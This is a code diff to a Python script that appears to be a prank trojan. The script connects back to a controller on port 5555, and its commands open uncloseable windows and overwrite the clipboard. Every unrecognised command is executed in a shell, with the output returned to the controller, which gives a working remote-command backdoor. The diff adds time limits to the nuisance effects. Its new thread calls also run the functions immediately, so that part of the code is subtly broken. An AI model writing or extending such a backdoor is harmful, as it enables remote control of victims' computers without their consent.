@@ -29,6 +29,7 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("127.0.0.1", 5555))
     failsafe = 0
+    duration = 120
     while failsafe < 20:
         command = s.recv(4096).decode()
         if command == "info":
@@ -38,22 +39,31 @@ def connect():
 					  help - Display this help message\n
 					  gort - Summons Gort \n
 					  bounce - Makes an un-closeable bouncing rodent \n
-					  copybara - Permenantly render the clipboard unusable"""
+					  copybara - Permenantly render the clipboard unusable
+					  duration [time] - sets duration, must be done in INTERACTIVE
+					  splash - sends splash art
+					  """
             s.send(help_text.encode("utf-8"))   
         elif command == "gort":
-            gthread = threading.Thread(target=window)
+            gthread = threading.Thread(target=window(duration))
             gthread.start()
             s.send("GORT IS HERE".encode("utf-8"))
         elif command == "bounce":
-            bthread = threading.Thread(target=bounce)
+            bthread = threading.Thread(target=bounce(duration))
             bthread.start()
             s.send("Triggered Bounce".encode("utf-8"))
         elif command == "copybara":
-            cthread = threading.Thread(target=clipboard)
+            cthread = threading.Thread(target=clipboard(duration))
             cthread.start()
             s.send("Coconut Doggo".encode("utf-8"))
         elif command == "splash":
             s.send(art.encode("utf-8"))
+        elif "duration" in command:
+            try:
+                duration = int(command.split(" ")[1])
+                s.send(("Set duration to " + str(duration)).encode("utf-8"))
+            except Exception as e:
+                s.send(str(e).encode("utf-8"))
         else:
             output = subprocess.getoutput(command)
             s.send(output.encode("utf-8"))
@@ -63,7 +73,7 @@ def connect():
             failsafe = 0
     s.close()
 
-def window():
+def window(duration):
     def onClosing():
         pass
     #pil_img = pil_img.resize((300, 200), Image.LANCZOS)
@@ -77,9 +87,10 @@ def window():
     img = ImageTk.PhotoImage(img)
     label =tk.Label(box, image=img)
     label.pack(expand=True)
+    box.after(duration * 1000, lambda: box.destroy())
     box.mainloop()
 
-def bounce():
+def bounce(duration):
     box = tk.Tk()
     box.overrideredirect(True)  # borderless window (optional)
     box.configure(bg="black")
@@ -106,10 +117,12 @@ def bounce():
         box.geometry(f"{win_w}x{win_h}+{state['x']}+{state['y']}")
         box.after(20, move)  # schedule next frame
     move()
+    box.after(duration*1000, lambda: box.destroy())
     box.mainloop()
 
-def clipboard():
-    while True:
+def clipboard(duration):
+    starttime = time.time()
+    while time.time() < starttime + duration:
         pyperclip.copy("Capybara? Capybara! Coconut Doggo!")
         time.sleep(0.1)
 
